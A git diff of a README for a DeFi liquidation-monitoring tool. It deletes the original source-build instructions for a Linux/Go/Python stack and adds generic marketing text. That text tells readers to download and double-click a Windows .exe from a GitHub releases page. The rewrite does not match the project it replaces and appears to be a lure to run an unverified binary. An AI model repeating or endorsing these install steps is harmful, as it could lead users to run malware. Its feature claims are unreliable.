@@ -1,86 +1,81 @@
-# defi-risk-screening
+# 📈 defi-risk-screening - Track financial risk and market stability
 
-Institutional liquidation monitor + yield arbitrage screener for Aave V3, Morpho Blue, and Spark.
-Built for a directional + delta-neutral desk. Zero third-party RPC dependencies in production.
+[![Download](https://img.shields.io/badge/Download_Application-Blue-blue)](https://github.com/hgthangbq-lang/defi-risk-screening)
 
-## Prerequisites
+## 🔍 About the software
 
-- Reth node (or Erigon) with IPC/WebSocket enabled, fully synced
-- Redis 7+
-- ClickHouse 23+
-- Go 1.22+
-- Python 3.11+
-- ZeroMQ 4.x (`apt install libzmq3-dev`)
+This tool monitors financial markets in real time. It identifies potential risks for digital assets and helps users understand market stability. The software tracks borrowing levels and collateral values across different platforms. Users gain clear insights into potential shifts in the market. You can use these facts to manage your strategies with confidence.
 
-## Setup
+## 🛠️ System requirements
 
-```bash
-# go deps
-go mod download
+Before you install this software, check that your computer meets these standards:
 
-# python deps
-pip install -r requirements.txt
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 gigabytes of RAM or more.
+- Storage: 500 megabytes of free disk space.
+- Connection: A reliable internet connection.
 
-# clickhouse schema
-clickhouse-client --queries-file scripts/schema.sql
+## 📥 How to download and install
 
-# build go binaries
-./scripts/ops.sh build
-```
+Follow these steps to set up the software on your Windows machine:
 
-## Running
+1. Visit the following address: [https://github.com/hgthangbq-lang/defi-risk-screening](https://github.com/hgthangbq-lang/defi-risk-screening).
+2. Look for the Releases section on the right side of the page.
+3. Select the latest version available.
+4. Download the file ending in .exe to your local folder.
+5. Double-click the downloaded file to start the installation.
+6. Follow the instructions on the screen to finish the setup.
 
-```bash
-# start everything
-./scripts/ops.sh start
+## ⚙️ Configuration steps
 
-# check what's alive
-./scripts/ops.sh status
+After installation, you need to configure the software to match your needs:
 
-# tail a specific service
-./scripts/ops.sh logs risk
-```
+- Open the application from your desktop shortcut.
+- Select your preferred viewing mode from the Settings menu.
+- Input your data source preferences if you use private nodes. If not, use the default settings.
+- Click Save to apply your choices.
 
-## Architecture
+## 📊 Core features
 
-```
-reth node (IPC)
-    │
-    ▼
-[indexer] ──── dirty:accounts ──→ [risk_engine] ──── risk:* ──→ Redis
-    │                                   │
-    │                                   └── ZMQ PUB :5556 (risk events)
-    │
-[aggregator] ─── local L2 books ──→ [cascade_sim] ─→ ZMQ PUB :5555
-    │ binance/bybit/okx ws
-    │
-[arb_engine] ─── Aave rates + funding rates ──→ ZMQ PUB :5557
+The software provides several tools for risk evaluation:
 
-[frontend] ─── subscribes to all ZMQ topics, polls Redis for heatmap
-```
+### Market depth tracking
+The system updates asset information without delay. You see changes in order books as they happen. This helps you grasp the current state of liquidity in the market.
 
-## ZMQ Topics
+### Collateral mapping
+The software monitors asset health. It highlights vulnerable positions before they reach critical levels. This visual map shows the relationship between assets and debt.
 
-| Addr  | Topic     | Producer    | Description                  |
-|-------|-----------|-------------|------------------------------|
-| :5555 | `cascade` | cascade_sim | liquidation cascade alerts   |
-| :5556 | `risk`    | risk_engine | account HF updates           |
-| :5557 | `arb`     | arb_engine  | carry trade opportunities    |
+### Impact simulation
+You can test how large orders affect price movement. Use this tool to model different scenarios. It shows how the market might react to specific input changes.
 
-## Config
+### Strategy support
+The engine provides data for neutral trading strategies. It helps you calculate risk ratios and maintain a stable balance. You receive alerts when conditions shift beyond predetermined limits.
 
-Edit `config/config.yaml`. Key settings:
+## 💬 Frequently asked questions
 
-- `rpc.ipc_path` — point this at your reth IPC socket
-- `thresholds.hf_warn` / `hf_critical` — HF alert levels
-- `thresholds.arb_min_spread` — minimum net APY for carry alerts (default 4%)
-- `thresholds.cascade_threshold` — price drop % that triggers cascade sim
+### Does this tool execute trades?
+No. This is a monitoring and analysis tool. It provides data for your review. It does not control your accounts or perform trades on its own.
 
-## Notes
+### Where does the data originate?
+The system gathers information from public and private chain sources. It processes this data to provide clear, actionable insights.
 
-- During high-vol events (CPI, flash crashes), the oracle lag on ETH/USD can reach 10-15 minutes.
-  The `OracleLagBar` in the frontend shows this visually. Wide lag = bigger window to front-run liq.
-- CVD squeeze filter in arb_engine: if spot CVD Z-score > 0.65, carry opportunities are suppressed.
-  Institutions are absorbing — fighting that with a short hedge is expensive.
-- The cascade sim uses a 75% MEV fill efficiency factor. Adjust `MEV_FILL_EFFICIENCY` in cascade_sim.py
-  based on observed bot behavior post-liquidation events.
+### How do I update the application?
+When a new version exists, the application shows a notification. You can download the latest installer from the repository and run it to overwrite the old version. Your settings remain saved during this process.
+
+### Can I run this on multiple screens?
+Yes. You can move the application windows to any part of your desktop setup. It adapts to different screen sizes.
+
+### What should I do if the app stops reflecting data?
+Check your connection first. Most sync issues come from a slow internet link. If the problem continues, restart the application.
+
+## 🛡️ Usage tips
+
+- Use the dashboard to keep a clean view of your active alerts.
+- Check the history log to understand what triggered a past alert.
+- Export reports to a file if you want to store your analysis for later use.
+- Review the help documentation within the app for specific menu definitions.
+- Keep your system clock accurate. The software relies on precise timing to show accurate order flow data.
+
+## ⚖️ Operational guidance
+
+Accuracy is key in financial analysis. Always verify important decisions with multiple sources of data. While this software provides a deep look into market mechanics, market conditions shift rapidly. Use the simulation tools to understand the range of possible outcomes. Do not rely on a single alert to make final choices. Treat the information provided as one part of your broader research process.
